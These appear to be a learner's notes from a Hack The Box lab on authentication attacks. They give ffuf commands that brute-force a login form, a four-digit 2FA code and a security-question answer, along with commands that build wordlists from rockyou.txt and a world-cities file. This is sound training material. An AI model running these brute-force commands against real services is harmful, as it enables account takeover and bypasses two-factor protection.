## User Enumeration
Brute-forcing

### Response Timing
[[Whitebox_Attacks]]

[[Important_Payloads_PWD_BruteForce.pdf]]

## Custom Payload (Policies)
```shell-session
alakin2504@htb[/htb]$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

alakin2504@htb[/htb]$ wc -l custom_wordlist.txt

151647 custom_wordlist.txt
```

## ffuf
```
ffuf -w ./custom_wordlist.txt -u http://94.237.59.98:57232/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```


## Sequence/OTP
```shell-session
alakin2504@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

```
ffuf -w ./tokens.txt -u http://83.136.249.227:51338/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=ant0a8oh57n370f08tsuft632h" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

OTP bruteforce

https://www.cirt.net/passwords => Default passwords DB

## Questions Bruteforce
```shell-session
alakin2504@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: Houston
```

File in question: https://github.com/datasets/world-cities/blob/main/data/world-cities.csv

```shell-session
alakin2504@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

alakin2504@htb[/htb]$ wc -l city_wordlist.txt 

26468 city_wordlist.txt
```

